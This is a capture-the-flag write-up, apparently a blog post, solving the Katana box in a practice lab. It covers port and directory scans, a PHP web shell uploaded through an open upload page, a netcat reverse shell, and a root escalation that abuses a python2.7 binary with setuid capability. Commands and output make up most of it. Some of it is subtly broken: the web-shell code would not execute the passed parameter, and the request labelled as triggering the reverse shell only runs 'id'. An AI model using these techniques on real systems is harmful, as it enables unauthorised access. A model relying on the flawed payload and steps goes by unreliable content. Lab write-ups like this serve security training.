---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/katana-1,482/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.

# discovery

Starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 192.168.214.83                
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-13 09:27 EST
Nmap scan report for 192.168.214.83
Host is up (0.11s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
42/tcp    filtered nameserver
80/tcp    open     http
1030/tcp  filtered iad1
1084/tcp  filtered ansoft-lm-2
1122/tcp  filtered availant-mgr
1533/tcp  filtered virtual-places
1580/tcp  filtered tn-tl-r1
2608/tcp  filtered wag-service
5061/tcp  filtered sip-tls
5850/tcp  filtered unknown
8009/tcp  filtered ajp13
8715/tcp  open  unknown
8088/tcp  open     radan-http
9968/tcp  filtered unknown
15003/tcp filtered unknown
38292/tcp filtered landesk-cba
56738/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds

$ nmap -Pn -p21,22,80,8088,8715 -sV 192.168.214.83 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-13 09:57 EST
Nmap scan report for 192.168.214.83
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
8088/tcp open  http    LiteSpeed httpd
8715/tcp open  http    nginx 1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
```

## dir busting
```bash
$ gobuster dir -u http://192.168.214.83/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.214.83/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/01/13 09:30:00 Starting gobuster in directory enumeration mode
===============================================================
/ebook                (Status: 301) [Size: 316] [--> http://192.168.214.83/ebook/]
/index.html           (Status: 200) [Size: 655]                                   
/index.html           (Status: 200) [Size: 655]                                   
                                                                                  
===============================================================
2023/01/13 09:37:32 Finished
===============================================================

$ gobuster dir -u http://192.168.214.83:8088/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.214.83:8088/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/01/13 09:33:13 Starting gobuster in directory enumeration mode
===============================================================
/blocked              (Status: 301) [Size: 1260] [--> http://192.168.214.83:8088/blocked/]
/cgi-bin              (Status: 301) [Size: 1260] [--> http://192.168.214.83:8088/cgi-bin/]
/css                  (Status: 301) [Size: 1260] [--> http://192.168.214.83:8088/css/]    
/docs                 (Status: 301) [Size: 1260] [--> http://192.168.214.83:8088/docs/]   
/error404.html        (Status: 200) [Size: 195]                                           
/img                  (Status: 301) [Size: 1260] [--> http://192.168.214.83:8088/img/]    
/index.html           (Status: 200) [Size: 655]                                           
/index.html           (Status: 200) [Size: 655]                                           
/phpinfo.php          (Status: 200) [Size: 50739]                                         
/phpinfo.php          (Status: 200) [Size: 50738]                                         
/protected            (Status: 301) [Size: 1260] [--> http://192.168.214.83:8088/protected/]
/upload.php           (Status: 200) [Size: 1800]                                            
/upload.html          (Status: 200) [Size: 6480]                                            
                                                                                            
===============================================================
2023/01/13 09:40:46 Finished
===============================================================
```

---

# exploitation

## file upload
Dir busting reveals that the resource `/upload.html` is availabe on port `8088`. This resource allows to upload files to the server.

![upload](/images/katana_upload.png)

Lets try to upload a simple file named `shell.php` with the following content.
```php
<?php system(['c']); ?>
```

![uploaded](/images/katana_uploaded.png)

> It seemed to have worked and was stored in the folder of a web server!
{: .prompt-info }

As we have no idea on which of the identified web servers (ports `80`, `8088` or `8715`) the web shell is stored, we now check on everyone of them.

```http
GET /katana_shell.php?c=id HTTP/1.1
Host: 192.168.214.83:8715
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=b3vuugbfm4fr4iq79n2fp4tvkt
Connection: close

HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 13 Jan 2023 14:56:51 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 54

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> The shell is stored on the web server on port `8715`!
{: .prompt-info }

---

# post exploitation

## reverse shell
### start listener on attacker machine
```bash
$ nc -lvp 80
listening on [any] 80 ...
```

### trigger reverse shell
```http
GET /katana_shell.php?c=id HTTP/1.1
Host: 192.168.214.83:8715
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=b3vuugbfm4fr4iq79n2fp4tvkt
Connection: close
```

### catch connection from target
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.214.83: inverse host lookup failed: Unknown host
connect to [192.168.49.214] from (UNKNOWN) [192.168.214.83] 49162
bash: cannot set terminal process group (425): Inappropriate ioctl for device
bash: no job control in this shell
www-data@katana:/opt/manager/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## get the first flag
```bash
www-data@katana:/$ find . -name local.txt
find . -name local.txt
./var/www/local.txt
www-data@katana:/$ cat ./var/www/local.txt
cat ./var/www/local.txt
6******************************9
```

## privilege escalation
After uploading `linpeas.sh` to the target server and executing the script it shows the following potential privilege escalation vector.
```bash
www-data@katana:/tmp$ sh linpeas.sh
sh linpeas.sh
...
Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
...
```

> We are able to escalate to `root` by using the binary `/usr/bin/python2.7`
{: .prompt-info }

```bash
www-data@katana:/tmp$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@katana:/tmp# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

> We are `root`! Yay!
{: .prompt-info }

## get the second flag
```bash
root@katana:/tmp# cd /root
cd /root
root@katana:/root# ls
ls
proof.txt  root.txt
root@katana:/root# cat proof.txt
cat proof.txt
d******************************8
```

Pwned! <@:-)